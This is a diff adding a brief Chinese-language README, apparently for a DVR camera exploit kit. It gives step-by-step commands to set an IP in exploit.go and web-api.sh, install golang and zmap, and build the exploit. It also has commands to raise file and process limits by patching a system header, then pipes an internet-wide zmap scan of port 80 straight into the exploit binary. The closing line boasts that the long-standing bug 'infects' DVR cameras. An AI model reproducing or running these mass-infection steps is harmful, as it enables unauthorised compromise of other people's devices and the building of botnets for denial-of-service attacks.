@@ -1,0 +1,19 @@
+更改exploit.go,     
+
+ip填写这里  和 web-api.sh    ，嗯.
+
+安装
+
+yum install update -y
+yum install golang -y
+yum install zmap -y
+
+继续
+
+cd DRV-MExploit
+go build exploit.go
+sed -i 's/1024/9999999/g' /usr/include/bits/typesizes.h;
+ulimit -n 999999; ulimit -u999999; 
+zmap -p80 -w Mddos.zone -q | ./exploit 80
+
+我说一下哈，这是一个长期存在的漏洞，会感染称一些 DVR 的摄像头设备，你懂得.
